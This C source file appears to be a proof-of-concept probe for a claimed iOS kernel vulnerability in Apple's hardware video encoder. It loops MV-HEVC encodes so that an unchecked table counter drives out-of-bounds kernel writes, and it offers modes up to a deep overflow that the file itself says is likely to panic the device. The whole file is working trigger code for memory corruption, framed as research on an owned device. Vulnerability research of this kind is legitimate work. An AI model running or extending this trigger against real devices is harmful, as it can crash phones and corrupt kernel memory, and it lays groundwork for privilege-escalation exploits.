/*
 * ave_counter_overflow.c — CVE-2026-114025 Counter-Based OOB Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key discovery: The VPS table uses a RUNNING COUNTER at table_base+0x0.
 * Each VPS/SPS/PPS NAL increments the counter by 1.
 * Write position = table_base + counter * 16.
 * After ~258 entries (~86 encodes), writes exceed the 4120-byte sub-object.
 * NO bounds check on the counter value.
 *
 * This probe encodes many frames in a single MV-HEVC session and monitors
 * for signs of the counter exceeding the sub-object boundary:
 *   - Encode success/failure transition point
 *   - Kernel panic (device reboot = OOB confirmed)
 *   - Error codes that indicate memory corruption
 *
 * Modes:
 *   safe     — 20 encodes (60 entries, well within bounds)
 *   boundary — 80-90 encodes (approach the 258-entry boundary)
 *   overflow — 90+ encodes (cross the boundary if no other check)
 *   max      — 200 encodes (deep OOB, likely panic or corruption)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit -framework IOSurface
 *        -o AVECounterOverflow ave_counter_overflow.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avecounteroverflow
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static int g_encode_count = 0;
static int g_last_cb_status = -999;
static int g_error_count = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_last_cb_status = (int)status;
    if (status != noErr) {
        g_error_count++;
        rlog("  [CB] encode #%d FAILED status=%d (flags=0x%x)\n",
             g_encode_count, (int)status, (unsigned)flags);
    }
}

static CVPixelBufferRef create_pixel_buffer(int w, int h, int frame_num) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) {
        uint8_t fill = (uint8_t)(frame_num & 0xFF);
        memset(base, fill, w * h * 4);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static int run_counter_test(const char *label, int layer_id, int num_encodes,
                            int width, int height) {
    rlog("\n========================================\n");
    rlog("Test: %s\n", label);
    rlog("  layer_id=%d, num_encodes=%d, %dx%d\n", layer_id, num_encodes, width, height);
    rlog("  Expected entries per encode: ~3 (VPS+SPS+PPS)\n");
    rlog("  Expected total entries: ~%d\n", num_encodes * 3);
    rlog("  Sub-object capacity: 256 entries (4096 bytes)\n");
    rlog("  OOB starts at entry: 258 (~86 encodes)\n");
    rlog("========================================\n");

    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    g_encode_count = 0;
    g_last_cb_status = -999;
    g_error_count = 0;

    OSStatus st = VTCompressionSessionCreate(NULL, width, height,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("  CREATE FAILED: %d\n", (int)st);
        return -1;
    }

    CFStringRef prof = CFSTR("HEVC_Main_AutoLevel");
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, prof);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    int base_layer = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    rlog("  prepare: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }

    uint64_t t_start = mach_absolute_time();
    int first_error_at = -1;

    for (int i = 0; i < num_encodes; i++) {
        g_encode_count = i + 1;

        CVPixelBufferRef pb = create_pixel_buffer(width, height, i);
        if (!pb) {
            rlog("  [%d] pixel buffer creation failed\n", i);
            break;
        }

        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);

        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        CVPixelBufferRelease(pb);

        if (st != noErr) {
            rlog("  [%d] ENCODE SUBMIT FAILED: %d (est. entries: ~%d)\n",
                 i, (int)st, (i + 1) * 3);
            if (first_error_at < 0) first_error_at = i;
            if (g_error_count >= 5) {
                rlog("  Too many errors, stopping at encode %d\n", i);
                break;
            }
            continue;
        }

        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        usleep(50000);

        if (g_last_cb_status != 0 && g_last_cb_status != -999) {
            rlog("  [%d] CALLBACK ERROR: %d (est. entries: ~%d)\n",
                 i, g_last_cb_status, (i + 1) * 3);
            if (first_error_at < 0) first_error_at = i;
        }

        if ((i + 1) % 10 == 0 || i == num_encodes - 1) {
            rlog("  [%d/%d] OK so far (est. entries: ~%d, errors: %d)\n",
                 i + 1, num_encodes, (i + 1) * 3, g_error_count);
        }
    }

    uint64_t t_end = mach_absolute_time();

    mach_timebase_info_data_t tbi;
    mach_timebase_info(&tbi);
    double elapsed_ms = (double)(t_end - t_start) * tbi.numer / tbi.denom / 1e6;

    rlog("\n--- Results for %s ---\n", label);
    rlog("  Encodes attempted: %d\n", g_encode_count);
    rlog("  Estimated entries: ~%d\n", g_encode_count * 3);
    rlog("  Errors: %d\n", g_error_count);
    rlog("  First error at encode: %d (est. entry ~%d)\n",
         first_error_at, first_error_at >= 0 ? (first_error_at + 1) * 3 : -1);
    rlog("  Sub-object boundary: entry 258 (encode ~86)\n");
    rlog("  Elapsed: %.1f ms\n", elapsed_ms);

    if (first_error_at < 0) {
        rlog("  VERDICT: All %d encodes succeeded\n", num_encodes);
        if (num_encodes >= 86) {
            rlog("  ** COUNTER EXCEEDED SUB-OBJECT BOUNDARY — OOB WRITES OCCURRED **\n");
        }
    } else if (first_error_at >= 86) {
        rlog("  VERDICT: Error at encode %d — AT or PAST sub-object boundary\n", first_error_at);
        rlog("  ** OOB BOUNDARY DETECTED — counter overflow confirmed **\n");
    } else {
        rlog("  VERDICT: Error at encode %d — BEFORE boundary (other issue)\n", first_error_at);
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    return first_error_at;
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_counter_overflow.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Counter-Based OOB Probe ===\n");
    rlog("Discovery: VPS table counter at table_base+0x0 increments per NAL.\n");
    rlog("After 258 entries (~86 encodes), writes exceed 4120-byte sub-object.\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "safe";

    if (strcmp(mode, "safe") == 0) {
        rlog("== SAFE MODE: 20 encodes (well within 256-entry limit) ==\n");
        run_counter_test("safe_lid1", 1, 20, 128, 128);

    } else if (strcmp(mode, "boundary") == 0) {
        rlog("== BOUNDARY MODE: Approach the 258-entry limit ==\n");
        run_counter_test("approach_80", 1, 80, 128, 128);
        run_counter_test("approach_85", 1, 85, 128, 128);
        run_counter_test("at_boundary_86", 1, 86, 128, 128);
        run_counter_test("past_boundary_90", 1, 90, 128, 128);

    } else if (strcmp(mode, "overflow") == 0) {
        rlog("== OVERFLOW MODE: Cross the boundary ==\n");
        rlog("WARNING: May cause kernel panic if OOB write corrupts critical data\n\n");
        run_counter_test("overflow_100", 1, 100, 128, 128);

    } else if (strcmp(mode, "max") == 0) {
        rlog("== MAX MODE: Deep OOB (200 encodes = ~600 entries) ==\n");
        rlog("WARNING: HIGH RISK of kernel panic\n\n");
        run_counter_test("deep_oob_200", 1, 200, 128, 128);

    } else if (strcmp(mode, "cumsum") == 0) {
        rlog("== CUMSUM MODE: Test cumulative sum limit ==\n");
        rlog("Cumsum limit: 0x801 (2049). With w22=24, cumsum/entry=3.\n");
        rlog("Limit hit at entry ~683 (~228 encodes).\n\n");
        run_counter_test("cumsum_test_220", 1, 220, 128, 128);
        run_counter_test("cumsum_test_230", 1, 230, 128, 128);

    } else if (strcmp(mode, "multi_layer") == 0) {
        rlog("== MULTI-LAYER MODE: Test with different layer IDs ==\n");
        rlog("Each layer_id targets a different sub-object's counter.\n\n");
        run_counter_test("layer0_safe", 0, 20, 128, 128);
        run_counter_test("layer1_safe", 1, 20, 128, 128);
        run_counter_test("layer2_safe", 2, 20, 128, 128);
        run_counter_test("layer1_boundary", 1, 90, 128, 128);

    } else {
        rlog("Usage: AVECounterOverflow <mode>\n");
        rlog("  safe         -- 20 encodes (well within bounds)\n");
        rlog("  boundary     -- 80-90 encodes (approach 258-entry limit)\n");
        rlog("  overflow     -- 100 encodes (cross the boundary)\n");
        rlog("  max          -- 200 encodes (deep OOB, likely panic)\n");
        rlog("  cumsum       -- 220-230 encodes (test cumsum limit at ~683 entries)\n");
        rlog("  multi_layer  -- test different layer IDs\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
